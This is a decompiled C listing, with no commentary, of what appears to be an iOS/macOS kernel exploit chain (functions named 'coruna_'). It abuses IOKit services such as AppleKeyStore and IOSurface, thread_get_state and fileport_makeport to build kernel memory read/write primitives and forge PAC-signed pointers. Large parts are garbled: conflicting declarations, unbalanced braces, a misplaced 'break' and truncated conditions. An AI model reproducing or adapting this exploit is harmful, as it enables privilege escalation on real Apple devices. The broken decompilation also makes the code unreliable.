    val[0x10] = 0;
    if (val[6] != 0) {
      _dlclose();
      val[6] = 0;
    }
    if (1 < *(semaphore_t *)((long)val + 0xcc) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,
                         *(semaphore_t *)((long)val + 0xcc));
      *(uint32_t *)((long)val + 0xcc) = 0;
    }
    *(uint8_t *)(val + 0x24) = 0;
    _pthread_mutex_unlock((pthread_mutex_t *)(val + 0x1a));
    _pthread_mutex_destroy((pthread_mutex_t *)(val + 0x1a));
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    _pthread_mutexattr_destroy((pthread_mutexattr_t *)(val + 0x22));
    val[0x22] = 0;
    val[0x23] = 0;
    val[0x24] = 0;
    val[0x15] = 0;
    val[0x14] = 0;
    val[0x17] = 0;
    val[0x16] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[0xf] = 0;
    val[0xe] = 0;
    val[0x11] = 0;
    val[0x10] = 0;
    val[0x13] = 0;
    val[0x12] = 0;
    val[0x19] = 0;
    val[0x18] = 0;
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    val[0x23] = 0;
    val[0x22] = 0;
  }
  return;
}
void coruna_bzero_2(long handle,unsigned long arg)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  long handle;
  unsigned long scratch [2048];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  version = *(unsigned long *)(handle + 0x520);
  _bzero(scratch,0x4000);
  handle = 0;
  do {
    if ((handle != 0) || (u = *(unsigned long *)(handle + 0x528), u == 0)) {
      u = *(unsigned long *)((long)&k_kernel_rodata_word_42f58 + handle);
    }
    size = *(unsigned long *)((long)&k_kernel_rodata_word_42f50 + handle);
    coruna_vm_copy_88e0(handle,version,scratch,0x4000);
    version = scratch[(u & arg) >> (size & 0x3f) & 0xffffffff];
    if ((*(unsigned long *)((long)&k_kernel_rodata_word_42f60 + handle) & (version ^ 0xffffffffffffffff)) != 0) break;
    if ((*(unsigned long *)((long)&k_kernel_rodata_word_42f68 + handle) & version) == *(unsigned long *)((long)&k_kernel_rodata_word_42f70 + handle)
       ) {
      version = version & (*(unsigned long *)((long)&k_kernel_rodata_word_42f48 + handle) ^ 0xffffffffffffffff) &
              0xfffffffff000 | *(unsigned long *)((long)&k_kernel_rodata_word_42f48 + handle) & arg;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(version);
    }
    version = version & 0xffffffffc000;
    handle = handle + 0x38;
  } while (handle != 0xa8);
  version = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(version);
}
void coruna_kernel5_via_ioservicegetmatchingservice(long handle,unsigned long arg,unsigned long arg,void *ctx)
{
  long handle;
  void *ptr;
  uint8_t *ptr;
  uint8_t *buf;
  int err;
  size_t ls6;
  long addr;
  unsigned long u;
  
  buf = k_kernel_vm_page_size_slot;
  ptr = k_kernel_vm_page_mask_slot;
  u = *(unsigned long *)k_kernel_vm_page_mask_slot;
  addr = *(long *)k_kernel_vm_page_size_slot;
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if ((err == 0) && (*(uint8_t *)(handle + 0x120) = 1, arg != 0)) {
    handle = arg + (u & arg);
    do {
      u = *(unsigned long *)ptr & arg;
      ls6 = ((handle + addr) - 1U & -addr) - u;
      if (arg <= ls6) {
        ls6 = arg;
      }
      err = coruna_ioservicegetmatchingservice(handle,arg & (*(unsigned long *)ptr ^ 0xffffffffffffffff),
                           (*(long *)buf + u + ls6) - 1 & -*(long *)buf,0);
      if (err != 0) break;
      ptr = (void *)(*(long *)(handle + 0x88) + (arg - *(long *)(handle + 0xa8)));
      if ((((uint)ptr | (uint)ls6) & 0xf) == 0) {
        _memcpy(ptr,ctx,ls6);
      }
      else {
        coruna_memcpy_unaligned();
      }
      arg = ls6 + arg;
      ctx = (void *)((long)ctx + ls6);
      arg = arg - ls6;
    } while (arg != 0);
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return;
}
void coruna_ioservicegetmatchingservice(long *handle,uint32_t *size)
{
  uint32_t u;
  uint64_t size;
  long handle;
  uint64_t scratch;
  uint64_t bootargs;
  
  u = *(uint32_t *)k_kernel_kiomasterportdefault_slot;
  size = _IOServiceMatching("AppleKeyStore");
  size = _IOServiceGetMatchingService(u,size);
  _IOServiceOpen(size,*(uint32_t *)k_kernel_mach_task_self_slot,0,size);
  handle = coruna_ret_stub_3(*handle,*size);
  size = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*handle,handle + 0x48);
  *(uint64_t *)(size + 6) = size;
  size = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*handle,handle);
  *(uint64_t *)(size + 8) = size;
  coruna_kernel5_via_fn_ptr_cast_10_10(*(uint64_t *)(*handle + 0x20),size);
  bootargs = k_kernel_rodata_word_00043428;
  scratch = k_kernel_rodata_word_43420;
  coruna_kernel5_via_helper_5d2c_419fc_2(*(uint64_t *)(*(long *)handle[1] + 8),(long *)handle[1],k_kernel_rodata_word_480a0,2,&scratch
              );
}
void coruna_ret_stub(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_kernel5_via_ioservicegetmatchingservice_2(val,id_2,0,size_3,off_4);
  return;
}
void coruna_kernel5_via_ioservicegetmatchingservice_2(long handle,unsigned long arg,uint64_t val,uint32_t *size,
                 uint8_t *buf)
{
  int err;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if ((((err == 0) && (*(uint8_t *)(handle + 0x120) = 1, (arg & 3) == 0)) &&
      (err = coruna_ioservicegetmatchingservice(handle,arg,4,val), err == 0)) &&
     (*size = *(uint32_t *)((*(long *)(handle + 0x88) + arg) - *(long *)(handle + 0xa8)),
     buf != (uint8_t *)0x0)) {
    *buf = 0;
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return;
}
void coruna_kernel5_via_ioservicegetmatchingservice_3(long handle,unsigned long arg,uint32_t size)
{
  int err;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if (((err == 0) && (*(uint8_t *)(handle + 0x120) = 1, (arg & 3) == 0)) &&
     (err = coruna_ioservicegetmatchingservice(handle,arg,4,0), err == 0)) {
    *(uint32_t *)((*(long *)(handle + 0x88) + arg) - *(long *)(handle + 0xa8)) = size;
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return;
}
void coruna_kernel5_via_ioservicegetmatchingservice_4(long handle,unsigned long arg,uint64_t val,uint64_t *id_2)
{
  int err;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if (((err == 0) && (*(uint8_t *)(handle + 0x120) = 1, (arg & 7) == 0)) &&
     (err = coruna_ioservicegetmatchingservice(handle,arg,8,val), err == 0)) {
    *id_2 = *(uint64_t *)((*(long *)(handle + 0x88) + arg) - *(long *)(handle + 0xa8));
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return;
}
void coruna_helper_6094_7600(long handle,unsigned long arg,uint64_t val)
{
  int err;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if (((err == 0) && (*(uint8_t *)(handle + 0x120) = 1, (arg & 7) == 0)) &&
     (err = coruna_ioservicegetmatchingservice(handle,arg,8,0), err == 0)) {
    *(uint64_t *)((*(long *)(handle + 0x88) + arg) - *(long *)(handle + 0xa8)) = val;
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return;
}
void coruna_dlopen_iosurface(uint *size,int *flags)
{
  unsigned long *ptr;
  unsigned long *buf;
  vm_address_t *address;
  vm_prot_t permission;
  byte err;
  uint8_t *str;
  uint8_t *copy;
  mach_port_t lm6;
  mach_msg_size_t lm7;
  mach_msg_id_t lm8;
  mach_msg_size_t lm9;
  mach_msg_id_t lm10;
  bool status;
  kern_return_t lk12;
  mach_port_name_t lm13;
  int err;
  pid_t lp15;
  mach_msg_return_t lm16;
  mach_port_t lm17;
  int status;
  uint u;
  uint size;
  uint version;
  uint port;
  unsigned long tag;
  void *ptr;
  char *ptr;
  uint64_t kind;
  long handle;
  long addr;
  unsigned long type_id;
  long off;
  long *buf;
  long base;
  uint64_t type_id_8;
  uint64_t type_id_9;
  int *err;
  uint *data;
  char *buf;
  uint type_id_10;
  uint32_t *obj;
  uint *block;
  unsigned long type_id_11;
  bool flags;
  vm_address_t lv43;
  unsigned long type_id_12;
  uint32_t *entry;
  long ctx_val;
  vm_size_t lv47;
  long *str;
  unsigned long type_id_13;
  uint32_t type_id_14;
  long serial;
  uint64_t *entry_9;
  long serial_7;
  long *copy;
  uint64_t type_id_15;
  unsigned long type_id_16;
  uint16_t type_id_17;
  vm_inherit_t in_stack_ffffffffffffeeb0;
  int scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long host_info;
  uint64_t serial_buf;
  unsigned long action;
  unsigned long block_ctx;
  long stack_guard;
  unsigned long *sa_saved;
  long sa_new;
  int *path_buf;
  int *tmp_buf;
  vm_size_t region;
  mem_entry_name_port_t plist [3];
  vm_address_t url_buf;
  char *json_buf [4];
  unsigned long frame;
  vm_address_t work;
  unsigned long cache;
  uint32_t cache_20;
  unsigned long cache_21;
  unsigned long cache_22;
  char *cache_23;
  long cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  mach_msg_header_t cache_27;
  uint host_info;
  uint32_t serial_buf;
  uint32_t action;
  uint32_t block_ctx;
  unsigned long stack_guard;
  unsigned long cache_28;
  uint64_t sa_saved;
  uint64_t cache_29;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_30;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_31;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache_32;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_33;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_34;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  long cache_35;
  
  copy = k_kernel_vm_page_size_slot;
  cache_35 = *(long *)k_kernel_stack_chk_guard_slot;
  url_buf = 0;
  plist[0] = 0;
  region = *(vm_size_t *)k_kernel_vm_page_size_slot;
  tag = coruna_call_return_zero_61a8_20f50();
  *(unsigned long *)(flags + 2) = tag;
  *(uint64_t *)(flags + 0xd3a) = k_kernel_rodata_word_42fe8;
  str = k_kernel_mach_task_self_slot;
  if ((0x400000000 < tag) ||
     (lk12 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&url_buf,0x2000,1),
     if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
     ___stack_chk_fail();
     }
     return;
}
void coruna_pacia_12_stub(long handle)
{
  if ((*(char *)(handle + 0x78) == '\0') && (*(int *)(*(long *)(handle + 0xa0) + 0x140) < 0x2258))
  {
    coruna_pacia_12(*(long *)(handle + 0xa0),0x2000);
  }
  return;
}
void coruna_memcpy(void *ctx,void *scratch,size_t len)
{
  if ((((uint)scratch | (uint)len) & 0xf) == 0) {
    _memcpy(ctx,scratch,len);
  }
  else {
    coruna_memcpy_unaligned();
  }
  return;
}
void coruna_memcpy_unaligned(uint64_t *val,uint64_t *id_2,unsigned long arg)
{
  unsigned long u;
  uint64_t *ptr;
  uint64_t *buf;
  unsigned long size;
  
  if (((unsigned long)val & 7) != 0) {
    size = 8 - ((unsigned long)val & 7);
    u = arg;
    if (size <= arg) {
      u = size;
    }
    arg = arg - u;
    for (; u != 0; u = u - 1) {
      *(uint8_t *)val = *(uint8_t *)id_2;
      val = (uint64_t *)((long)val + 1);
      id_2 = (uint64_t *)((long)id_2 + 1);
    }
  }
  u = arg;
  if ((((unsigned long)id_2 & 7) == 0) && (u = arg & 7, 7 < arg)) {
    size = arg >> 3;
    ptr = val;
    buf = id_2;
    do {
      id_2 = buf + 1;
      val = ptr + 1;
      *ptr = *buf;
      size = size - 1;
      ptr = val;
      buf = id_2;
    } while (size != 0);
  }
  for (; u != 0; u = u - 1) {
    *(uint8_t *)val = *(uint8_t *)id_2;
    val = (uint64_t *)((long)val + 1);
    id_2 = (uint64_t *)((long)id_2 + 1);
  }
  return;
}
void coruna_kernel5_via_thread_get_state(long handle,long addr_2,unsigned long arg,long off_3)
{
  int err;
  unsigned long u;
  long scratch;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x638));
  if (err == 0) {
    scratch = 0;
    if (arg != 0) {
      u = 0;
      do {
        err = coruna_thread_get_state(handle,u + addr_2,u + off_3,arg - u,&scratch);
        if (err != 0) break;
        u = scratch + u;
      } while (u < arg);
    }
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x638));
  }
  return;
}
void coruna_thread_get_state(long handle,unsigned long arg,void *ctx,size_t len,size_t *size_2)
{
  long handle;
  long addr;
  int err;
  kern_return_t lk4;
  unsigned long u;
  unsigned long size;
  uint64_t scratch;
  natural_t bootargs [135];
  mach_msg_type_number_t thread_attr;
  
  thread_attr = 0x84;
  size = *(unsigned long *)k_kernel_vm_page_mask_slot;
  u = size & arg;
  if (*(long *)k_kernel_vm_page_size_slot - 0x210U <= u) {
    u = *(long *)k_kernel_vm_page_size_slot - 0x210U;
  }
  scratch = 0;
  handle = handle + 0xf0;
  err = coruna_kernel5_via_ioservicegetmatchingservice_4(handle,*(uint64_t *)(handle + 0x2a0),0,&scratch);
  if (err == 0) {
    addr = u + (arg & (size ^ 0xffffffffffffffff));
    err = coruna_helper_6094_7600(handle,*(uint64_t *)(handle + 0x2a0),addr + -0x10);
    if (err == 0) {
      lk4 = _thread_get_state(*(thread_act_t *)(handle + 0x300),0x11,bootargs,&thread_attr);
      if (lk4 == 0 && thread_attr == 0x84) {
        u = (addr - arg) + 0x210;
        if (u <= len) {
          len = u;
        }
        *size_2 = len;
        _memcpy(ctx,(void *)((long)bootargs + (arg - addr)),len);
      }
      coruna_helper_6094_7600(handle,*(uint64_t *)(handle + 0x2a0),scratch);
    }
  }
  return;
}
void coruna_open_iosurface_root(long handle)
{
  uint64_t *ptr;
  uint32_t u;
  unsigned long size;
  uint version;
  int err;
  int status;
  uint port;
  uint32_t *buf;
  uint8_t *str;
  uint8_t *copy;
  long handle;
  uint64_t tag;
  long addr;
  long off;
  unsigned long kind;
  long base;
  int *err;
  long ctx_val;
  long serial;
  uint *data;
  unsigned long type_id;
  unsigned long type_id_8;
  vm_size_t size;
  long *ptr;
  uint32_t *obj;
  int flags;
  uint scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint serial_buf [2];
  uint32_t *action;
  char block_ctx;
  mem_entry_name_port_t stack_guard;
  vm_size_t sa_saved;
  long sa_new;
  unsigned long path_buf;
  uint tmp_buf;
  int region;
  uint plist;
  unsigned long url_buf;
  unsigned long json_buf;
  unsigned long frame;
  long work;
  uint64_t cache;
  uint64_t cache_20;
  long cache_21;
  unsigned long cache_22 [3];
  uint32_t bootargs;
  uint32_t cache_23;
  uint32_t thread_attr;
  uint64_t host_info;
  uint32_t cache_24;
  unsigned long cache_25;
  long cache_26;
  
  cache_26 = *(long *)k_kernel_stack_chk_guard_slot;
  buf = _calloc(1,0x710);
  if (buf != (uint32_t *)0x0) {
    flags = 0;
    obj = buf + 4;
    *buf = 8;
    ptr = (long *)(buf + 2);
    *ptr = handle;
    ptr = (uint64_t *)(buf + 0xa2);
    u = *(uint32_t *)k_kernel_kiomasterportdefault_slot;
    serial = handle;
    do {
      str = (uint8_t *)coruna_dlopen_iosurface(buf + 0x3c,serial);
      copy = str;
      if ((int)str == 0) {
        scratch = *(uint64_t *)(buf + 0x6c);
        host_info = *(uint64_t *)(buf + 0x6a);
        str = (uint8_t *)
                 coruna_kernel5_via_call_return_zero_61a8_165ac(coruna_bzero_2,coruna_ret_stub,buf + 0x3c,obj,*ptr,&host_info);
        copy = str;
        if (((int)str != 0) ||
           (str = (uint8_t *)coruna_kernel5_via_pacia_12(buf), copy = str, (int)str != 0))
        {
          serial = *ptr;
          *(uint64_t *)(serial + 0x30) = 0;
          *(uint64_t *)(serial + 0x50) = 0;
          status = (int)copy;
          {
          {
          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
          return;
          }
          ___stack_chk_fail(str);
          }
          break;
          }
          flags = flags + 1;
        }
        *(unsigned long *)(buf + 0xac) = *(long *)(buf + 0x28) + (unsigned long)(uint)buf[0x91];
        str = (uint8_t *)coruna_pthread_mutex_init(buf);
        copy = str;
        if (((int)str != 0) ||
           ((str = (uint8_t *)coruna_getpid(buf), copy = str, (int)str != 0 ||
            (str = (uint8_t *)coruna_kernel5_via_vm_deallocate(buf), copy = str, (int)str != 0))))
        {
          serial = *ptr;
          *(uint64_t *)(serial + 0x30) = 0;
          *(uint64_t *)(serial + 0x50) = 0;
          status = (int)copy;
          {
          {
          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
          return;
          }
          ___stack_chk_fail(str);
          }
          break;
          }
          flags = flags + 1;
        }
        data = (uint *)*ptr;
        type_id = *(unsigned long *)(data + 0x56);
        if (type_id < 0x1f530f02800000) {
          if ((0x1c1b0a800fffff < type_id) &&
             (((*data & 0x5584001) != 0 || (0x1f52ffffffffff < type_id)))) goto done;
          cache = 0xffffffffffffffff;
          cache_20 = 0xffffffffffffffff;
          copy = (uint8_t *)coruna_kernel5_via_pacia_12(buf);
          if (((int)copy == 0) &&
             (((copy = (uint8_t *)coruna_kernel5_residual_235(&cache_20), (int)copy == 0 &&
               (copy = (uint8_t *)coruna_kernel5_via_fcntl(&cache_20), (int)copy == 0)) &&
              (copy = (uint8_t *)coruna_kernel5_residual_235(&cache), (int)copy == 0)))) {
            coruna_vm_deallocate(obj);
            copy = (uint8_t *)
                      coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,*(uint64_t *)(buf + 0x86),cache_20 & 0xffffffff,
                                   cache_22);
            if ((((int)copy == 0) &&
                (copy = (uint8_t *)
                           coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,*(uint64_t *)(buf + 0x86),cache & 0xffffffff,
                                        &cache_21), (int)copy == 0)) &&
               (copy = (uint8_t *)
                          coruna_kernel5_via_helper_6094_7600(buf,cache_22[0] + (uint)buf[0x9c],cache_21),
               (int)copy == 0)) {
              serial = *ptr;
              *(int *)(&k_kernel_slot_1930 + serial) = (int)cache_20;
              *(int *)(&k_kernel_slot_1934 + serial) = cache_20;
              *(int *)(&k_kernel_slot_1938 + serial) = (int)cache;
              *(uint *)(&k_kernel_slot_193c + serial) = cache;
              copy = &UNK_0003f004;
              if ((((int)cache_20 != -1) && (cache_20 != -1)) &&
                 ((copy = &UNK_0003f004, (int)cache != -1 && (cache != -1)))) {
                serial = *(long *)(buf + 0xa0);
                if (serial == 0) {
                  copy = (uint8_t *)coruna_kernel5_residual_218(buf);
                  {
                    if ((int)cache_20 != -1) {
                    _close((int)cache_20);
                    }
                    if (cache_20 != -1) {
                    _close(cache_20);
                    }
                    if ((int)cache != -1) {
                    _close((int)cache);
                    }
                    version = cache;
                    if (cache != 0xffffffff) {
                    version = _close(cache);
                    }
                    str = (uint8_t *)(unsigned long)version;
                    serial = *ptr;
                    *(uint64_t *)(&k_kernel_slot_1938 + serial) = 0xffffffffffffffff;
                    *(uint64_t *)(&k_kernel_slot_1930 + serial) = 0xffffffffffffffff;
                    serial = *ptr;
                    *(uint64_t *)(serial + 0x30) = 0;
                    *(uint64_t *)(serial + 0x50) = 0;
                    status = (int)copy;
                    {
                    {
                    if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                    return;
                    }
                    ___stack_chk_fail(str);
                    }
                    break;
                    }
                    flags = flags + 1;
                  }
                  serial = *(long *)(buf + 0xa0);
                }
                status = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,serial + (unsigned long)(uint)buf[0x95],ptr,0);
                copy = &k_kernel_rodata_word_3f002;
                if (status == 0) {
                  serial = *ptr;
                  *(uint64_t *)(&k_kernel_slot_19d0 + serial) = *ptr;
                  copy = (uint8_t *)
                            coruna_kernel5_via_fileport_makeport(serial,*(uint32_t *)(&k_kernel_slot_1930 + serial));
                  if (((((int)copy == 0) &&
                       (copy = (uint8_t *)
                                  coruna_kernel5_via_fileport_makeport(*ptr,*(uint32_t *)(&k_kernel_slot_1934 + *ptr)),
                       (int)copy == 0)) &&
                      (copy = (uint8_t *)
                                 coruna_kernel5_via_fileport_makeport(*ptr,*(uint32_t *)(&k_kernel_slot_1938 + *ptr)),
                      (int)copy == 0)) &&
                     (str = (uint8_t *)
                               coruna_kernel5_via_fileport_makeport(*ptr,*(uint32_t *)(&k_kernel_slot_193c + *ptr)),
                     {
                       serial = *ptr;
                       *(uint64_t *)(serial + 0x30) = 0;
                       *(uint64_t *)(serial + 0x50) = 0;
                       status = (int)copy;
                       {
                       {
                       if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                       return;
                       }
                       ___stack_chk_fail(str);
                       }
                       break;
                       }
                       flags = flags + 1;
                     }
                }
              }
            }
          }
cleanup:
          if ((int)cache_20 != -1) {
            _close((int)cache_20);
          }
          if (cache_20 != -1) {
            _close(cache_20);
          }
          if ((int)cache != -1) {
            _close((int)cache);
          }
          version = cache;
          if (cache != 0xffffffff) {
            version = _close(cache);
          }
          str = (uint8_t *)(unsigned long)version;
          serial = *ptr;
          *(uint64_t *)(&k_kernel_slot_1938 + serial) = 0xffffffffffffffff;
          *(uint64_t *)(&k_kernel_slot_1930 + serial) = 0xffffffffffffffff;
          {
            serial = *ptr;
            *(uint64_t *)(serial + 0x30) = 0;
            *(uint64_t *)(serial + 0x50) = 0;
            status = (int)copy;
            {
            {
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
            return;
            }
            ___stack_chk_fail(str);
            }
            break;
            }
            flags = flags + 1;
          }
        }
        if (((*data & 0x5584001) == 0) && (type_id < 0x1f541900000000)) {
done:
          cache = 0xffffffffffffffff;
          path_buf = path_buf & 0xffffffff00000000;
          copy = (uint8_t *)coruna_kernel5_residual_235(&cache);
          if (((int)copy == 0) &&
             (copy = (uint8_t *)coruna_kernel5_via_fcntl(&cache), (int)copy == 0)) {
            coruna_kernel5_residual_237(&cache,&path_buf,4);
            coruna_kernel5_residual_238(&cache,&path_buf,4);
            status = _socket(2,2,0);
            if (status == -1) {
              copy = &UNK_0003f003;
            }
            else {
              copy = (uint8_t *)
                        coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,*(uint64_t *)(buf + 0x86),cache & 0xffffffff,
                                     &work);
              if ((int)copy == 0) {
                coruna_vm_deallocate(obj);
                copy = (uint8_t *)
                          coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,work + (unsigned long)(uint)buf[0x9c],&frame,0);
                if ((((int)copy == 0) &&
                    (copy = (uint8_t *)
                               coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_2(buf,*(uint64_t *)(buf + 0x86),status,&json_buf),
                    type_id = json_buf, (int)copy == 0)) &&
                   (copy = (uint8_t *)
                              coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,json_buf + (uint)buf[0x9a],&url_buf,0),
                   (int)copy == 0)) {
                  serial = *(long *)(buf + 2);
                  *(void (**)(serial + 0x30) = coruna_kernel5_residual_217;
                  *(uint32_t **)(serial + 0x50) = buf;
                  copy = (uint8_t *)coruna_kernel5_residual_253(serial,&cache,url_buf);
                  if ((int)copy == 0) {
                    serial = *(long *)(buf + 2);
                    *(uint64_t *)(serial + 0x30) = 0;
                    *(uint64_t *)(serial + 0x50) = 0;
                    str = (uint8_t *)coruna_kernel5_via_helper_6094_7600(buf,type_id + (uint)buf[0x9a],frame);
                    copy = str;
                    if ((int)str == 0) {
                      serial = *ptr;
                      *(int *)(&k_kernel_slot_1930 + serial) = (int)cache;
                      *(uint *)(&k_kernel_slot_1934 + serial) = cache;
                      *(int *)(&k_kernel_slot_1940 + serial) = status;
                      *(unsigned long *)(serial + 0x218) = frame;
                      if (((int)cache == -1) || (cache == -1)) {
                        copy = (uint8_t *)0x28001;
                      }
                      else {
                        copy = (uint8_t *)0x28001;
                        if (frame != 0) {
                          cache_21 = 0;
                          cache_22[0] = 0;
                          status = _open("/private/etc/group",0);
                          if (status == -1) {
                            err = ___error();
                            status = *err;
                            data = (uint *)___error();
                            version = -*data;
                            if (-1 < status) {
                              version = *data;
                            }
                            copy = (uint8_t *)(unsigned long)(version | 0x40000000);
                          }
                          else {
                            copy = (uint8_t *)
                                      coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_2(buf,*(uint64_t *)(buf + 0x86),status,
                                                   &cache_21);
                            if (((int)copy == 0) &&
                               (copy = (uint8_t *)
                                          coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,cache_21 + (unsigned long)(uint)buf[0x98],
                                                       cache_22,0), (int)copy == 0)) {
                              serial = -0x20000;
                              if (*(int *)(*ptr + 0x140) < 0x1f54) {
                                serial = 0x80;
                              }
                              thread_attr = serial + cache_22[0];
                              type_id = cache_22[0];
                              if (*(int *)(*ptr + 0x140) < 0x1f54) {
                                type_id = cache_22[0] + 0x400;
                              }
                              copy = (uint8_t *)0xad011;
                              if (thread_attr < type_id) {
                                bootargs = 0;
                                err = 0;
                                do {
                                  copy = (uint8_t *)coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,thread_attr,&cache_20,1);
                                  if ((int)copy != 0) break;
                                  if (bootargs == 0) {
                                    bootargs = thread_attr;
                                    if (cache_20 != 7) {
                                      bootargs = 0;
                                    }
                                    serial = *ptr;
                                  }
                                  else {
                                    kind = coruna_kernel5_via_pacia_12_10(*ptr,cache_20);
                                    serial = *ptr;
                                    if ((kind < *(unsigned long *)(&k_kernel_slot_19e8 + serial)) ||
                                       ((kind & 3) != 0 ||
                                        *(unsigned long *)(&k_kernel_slot_19f0 + serial) <= kind)) {
                                      err = 0;
                                      bootargs = 0;
                                    }
                                    else {
                                      err = err + 1;
                                      if (err == 7) {
                                        *(unsigned long *)(serial + 0x220) = bootargs;
                                        _close(status);
                                        serial = *(long *)(buf + 0xa0);
                                        if (serial == 0) {
                                          copy = (uint8_t *)coruna_kernel5_residual_218(buf);
                                          {
                                            if ((int)cache != -1) {
                                            _close((int)cache);
                                            }
                                            version = cache;
                                            if (cache != 0xffffffff) {
                                            version = _close(cache);
                                            }
                                            str = (uint8_t *)(unsigned long)version;
                                            *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
                                            serial = *ptr;
                                            *(uint64_t *)(serial + 0x30) = 0;
                                            *(uint64_t *)(serial + 0x50) = 0;
                                            status = (int)copy;
                                            {
                                            {
                                            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                            return;
                                            }
                                            ___stack_chk_fail(str);
                                            }
                                            break;
                                            }
                                            flags = flags + 1;
                                          }
                                          serial = *(long *)(buf + 0xa0);
                                        }
                                        status = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,serial + (unsigned long)(uint)buf[
                                                  0x95],ptr,0);
                                        copy = &k_kernel_rodata_word_3f002;
                                        {
                                          if ((int)cache != -1) {
                                          _close((int)cache);
                                          }
                                          version = cache;
                                          if (cache != 0xffffffff) {
                                          version = _close(cache);
                                          }
                                          str = (uint8_t *)(unsigned long)version;
                                          *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
                                          serial = *ptr;
                                          *(uint64_t *)(serial + 0x30) = 0;
                                          *(uint64_t *)(serial + 0x50) = 0;
                                          status = (int)copy;
                                          {
                                          {
                                          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                          return;
                                          }
                                          ___stack_chk_fail(str);
                                          }
                                          break;
                                          }
                                          flags = flags + 1;
                                        }
                                        serial = *ptr;
                                        *(uint64_t *)(&k_kernel_slot_19d0 + serial) = *ptr;
                                        copy = (uint8_t *)
                                                  coruna_kernel5_via_fileport_makeport(serial,*(uint32_t *)
                                                                       (&k_kernel_slot_1930 + serial));
                                        if (((int)copy != 0) ||
                                           (str = (uint8_t *)
                                                     coruna_kernel5_via_fileport_makeport(*ptr,*(uint32_t *)
                                                                            (&k_kernel_slot_1934 +
                                                                            *ptr)),
                                           {
                                             if ((int)cache != -1) {
                                             _close((int)cache);
                                             }
                                             version = cache;
                                             if (cache != 0xffffffff) {
                                             version = _close(cache);
                                             }
                                             str = (uint8_t *)(unsigned long)version;
                                             *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
                                             serial = *ptr;
